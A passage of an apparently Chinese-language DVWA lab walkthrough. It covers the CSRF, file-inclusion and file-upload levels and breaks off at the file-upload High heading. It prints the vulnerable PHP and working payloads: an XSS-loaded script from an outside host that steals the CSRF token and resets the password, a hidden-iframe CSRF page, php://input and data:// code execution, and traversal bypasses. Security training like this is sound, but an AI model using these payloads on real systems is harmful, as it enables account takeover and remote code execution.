class="hljs-variable">$data</span>[<span class="hljs-string">"password_new"</span>];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">"password_conf"</span>];<br>        <span class="hljs-variable">$change</span> = <span class="hljs-literal">true</span>;<br>    }<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"user_token"</span>, <span class="hljs-variable">$_REQUEST</span>) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_new"</span>, <span class="hljs-variable">$_REQUEST</span>) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_conf"</span>, <span class="hljs-variable">$_REQUEST</span>) &amp;&amp;<br>        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"Change"</span>, <span class="hljs-variable">$_REQUEST</span>)) {<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"user_token"</span>];<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"password_new"</span>];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"password_conf"</span>];<br>        <span class="hljs-variable">$change</span> = <span class="hljs-literal">true</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>这串代码主要是判断用户传入的数据是否为json类型，如果是的话，进行json解密传给data，接着判断是否存在四个指定的变量，如果存在，则各自赋值。如果不是json数据类型，则仍然判断是否存在这四个变量，如果存在则分别赋值</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$change</span>) {<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$token</span>, <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );<br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span> (<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>], <span class="hljs-variable">$pass_new</span>);<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '"</span> . <span class="hljs-variable">$pass_new</span> . <span class="hljs-string">"' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-variable">$return_message</span> = <span class="hljs-string">"Password Changed."</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-variable">$return_message</span> = <span class="hljs-string">"Passwords did not match."</span>;<br>    }<br><br>    <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_type</span> == <span class="hljs-string">"json"</span>) {<br>        <span class="hljs-title function_ invoke__">generateSessionToken</span>();<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"Content-Type: application/json"</span>);<br>        <span class="hljs-keyword">print</span> <span class="hljs-title function_ invoke__">json_encode</span> (<span class="hljs-keyword">array</span>(<span class="hljs-string">"Message"</span> =&gt;<span class="hljs-variable">$return_message</span>));<br>        <span class="hljs-keyword">exit</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;"</span> . <span class="hljs-variable">$return_message</span> . <span class="hljs-string">"&lt;/pre&gt;"</span>;<br>    }<br>}<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里显示检查了用户token是否与session匹配，然后判断两次密码输入是否一致，如果一致则直接进行密码的更新，同时防止了SQL注入的可能。</p>
<p>很明显这里并不能有效的阻止CSRF的存在，只要我们想办法可以获取到用户的token即可成功攻击。</p>
<h3 id="JS发起HTTP-CSRF请求">JS发起HTTP CSRF请求</h3>
<p>新建一个csrf.js文件：</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 首先访问这个页面 来获取 token</span><br><span class="hljs-keyword">var</span> tokenUrl = <span class="hljs-string">'http://127.0.0.1/dvwa/vulnerabilities/csrf/'</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">XMLHttpRequest</span>) {<br>    xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>}<span class="hljs-keyword">else</span>{<br>    xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">"Microsoft.XMLHTTP"</span>);<br>}<br><br><span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span>;<br>xmlhttp.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;<br>xmlhttp.<span class="hljs-property">onreadystatechange</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){<br>    <span class="hljs-keyword">if</span>(xmlhttp.<span class="hljs-property">readyState</span> ==<span class="hljs-number">4</span> &amp;&amp; xmlhttp.<span class="hljs-property">status</span>==<span class="hljs-number">200</span>)<br>    {<br>          <span class="hljs-comment">// 使用正则提取 token</span><br>        <span class="hljs-keyword">var</span> text = xmlhttp.<span class="hljs-property">responseText</span>;<br>        <span class="hljs-keyword">var</span> regex = <span class="hljs-regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;<br>        <span class="hljs-keyword">var</span> match = text.<span class="hljs-title function_">match</span>(regex);<br>        <span class="hljs-keyword">var</span> token = match[<span class="hljs-number">1</span>];<br>          <span class="hljs-comment">// 发起 CSRF 请求 将 token 带入</span><br>        <span class="hljs-keyword">var</span> new_url = <span class="hljs-string">'http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token='</span>+token+<span class="hljs-string">'&amp;password_new=123456&amp;password_conf=123456&amp;Change=Change'</span>;<br>        <span class="hljs-keyword">if</span>(count==<span class="hljs-number">0</span>){<br>            count++;<br>            xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">"GET"</span>,new_url,<span class="hljs-literal">false</span>);<br>            xmlhttp.<span class="hljs-title function_">send</span>();<br>        }<br>    }<br>};<br>xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">"GET"</span>,tokenUrl,<span class="hljs-literal">false</span>);<br>xmlhttp.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></tbody></table></figure>
<p>将这个 csrf.js 上传到外网的服务器上，<code>http://your-website/csrf.js</code>，随后访问dvwa的xss high级别，插入恶意js代码</p>
<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src="http://your-website/csrf.js"&gt;&lt;/script&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 123456 了</p>
<p>另外这里学习了国光师傅的另一种思路：</p>
<h3 id="常规-HTML-发起-CSRF-请求">常规 HTML 发起 CSRF 请求</h3>
<p>假设攻击者这里可以将 HTML 保存上传到 CORS 的跨域白名单下的话，那么这里也可以通过 HTML 这种组合式的 CSRF 攻击。</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>){</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"get_token"</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">'user_token'</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">'user_token'</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>=token;</span><br><span class="language-javascript">    <span class="hljs-title function_">alert</span>(token);</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"csrf"</span>).<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">  }</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"get_token"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"attack()"</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"csrf"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_new"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_conf"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"user_token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Change"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Change"</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>将上述文件保存为 csrf.html 然后放入到 CORS 白名单目录下，这在实战中比较少见，这里为了演示效果，我们可以将这个文件放入到靶场服务器的根目录下，然后直接访问这个页面即可发起 CSRF 攻击：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/csrf.html<br></code></pre></td></tr></tbody></table></figure>
<h2 id="Impossible-3">Impossible</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212049060.png" alt="image-20240111212049060"></p>
<p>与之前的级别不同点在于，这里增加了一个输入框，要求用户写出当前密码，只有当前密码是正确的，才会执行修改密码的操作。</p>
<p>这对于不知道受害者原始密码的攻击者来说，根本无法完成CSRF攻击了。</p>
<h1>0x04 File Inclusion</h1>
<h2 id="Low-4">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>可以看到非常捡漏，对于page参数没有做任何限制，这意味着我们可以实现任意文件包含，而这里的包含函数并不在此代码中。</p>
<h3 id="文件读取">文件读取</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212751466.png" alt="image-20240111212751466"></p>
<p>正常在linux下是是要读取/etc/passwd等文件的</p>
<h3 id="远程文件包含">远程文件包含</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212836673.png" alt="image-20240111212836673"></p>
<h3 id="本地文件包含-Getshell">本地文件包含 Getshell</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213022537.png" alt="image-20240111213022537"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213001264.png" alt="image-20240111213001264"></p>
<p>这里需要匹配文件上传漏洞，来进行本地包含</p>
<h3 id="远程文件包含-Getshell">远程文件包含 Getshell</h3>
<p>当然这里也可以包含远程服务器上的恶意文件getshell，就不演示了</p>
<h3 id="伪协议读取">伪协议读取</h3>
<p><code>php://filter</code></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?page=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213224202.png" alt="image-20240111213224202"></p>
<p>解码即可</p>
<p><code>php://input getshell</code></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'info.php'</span>,<span class="hljs-string">'w'</span>),<span class="hljs-string">'&lt;?php phpinfo();?&gt;'</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213429717.png" alt="image-20240111213429717"></p>
<p>不过这里不知道是和原因，hackbar发不出去，只能bp发送</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214209787.png" alt="image-20240111214209787"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214156755.png" alt="image-20240111214156755"></p>
<p><code>data:// 伪协议</code></p>
<p>数据封装器，和 php:// 相似，可以直接执行任意 PHP 代码：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/fi/?page=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br>/fi/?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>b<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214323842.png" alt="image-20240111214323842"></p>
<h2 id="Medium-4">Medium</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];<br><span class="hljs-comment">// Input validation</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">"http://"</span>, <span class="hljs-string">"https://"</span> ), <span class="hljs-string">""</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">"../"</span>, <span class="hljs-string">"..\\"</span> ), <span class="hljs-string">""</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里加了几个过滤，将http协议与https协议过滤为空，以及防止目录穿越。</p>
<p>但这里我们注意到没有过滤伪协议，以及它仅仅是将敏感字符过滤为空，这意味着我们可以双写绕过</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?page=....<span class="hljs-comment">//....//....//flag.txt</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214557607.png" alt="image-20240111214557607"></p>
<p>同样的远程文件包含也可以双写绕过</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?page=hhttp://ttp://www.baidu.com/robots.txt<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214750871.png" alt="image-20240111214750871"></p>
<h2 id="High-4">High</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">fnmatch</span>( <span class="hljs-string">"file*"</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"include.php"</span> ) {<br>    <span class="hljs-comment">// This isn't the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>;<br>    <span class="hljs-keyword">exit</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里说如果page参数不是以file开头的，或者不是include.php，则exit退出，很明显可以用file伪协议</p>
<h2 id="Impossible-4">Impossible</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];<br><br><span class="hljs-comment">// Only allow include.php or file{1..3}.php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$file</span> != <span class="hljs-string">"include.php"</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"file1.php"</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"file2.php"</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"file3.php"</span> ) {<br>    <span class="hljs-comment">// This isn't the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>;<br>    <span class="hljs-keyword">exit</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里进行了白名单过滤，如果不是这三个指定文件中的一个，则exit退出，很明显我们无法进行攻击了。</p>
<h1>0x05 File Upload</h1>
<h2 id="Low-5">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">"hackable/uploads/"</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ] );<br><br>    <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ], <span class="hljs-variable">$target_path</span> ) ) {<br>        <span class="hljs-comment">// No</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Yes!</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>首先自定义了上传路径，接着直接对upload参数内容进行上传，并没有对内容做出过滤。很明显可以任意文件上传</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111215609154.png" alt="image-20240111215609154"></p>
<p>这里将上传文件路径输出了，直接跟着路径访问即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111215640275.png" alt="image-20240111215640275"></p>
<h2 id="Medium-5">Medium</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">"hackable/uploads/"</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'type'</span> ];<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'size'</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">"image/jpeg"</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">"image/png"</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) {<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ], <span class="hljs-variable">$target_path</span> ) ) {<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>依旧是定义了上传路径，接着取出了上传文件的文件名，文件类型，文件大小。</p>
<p>如果文件类型不是jpeg或者png，且文件上传大小超出了限制，则上传失败，否则成功上传。</p>
<p>但这里只是对content-type做出了限制，我们修改即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111220057185.png" alt="image-20240111220057185"></p>
<h2 id="High-5">High</h2>
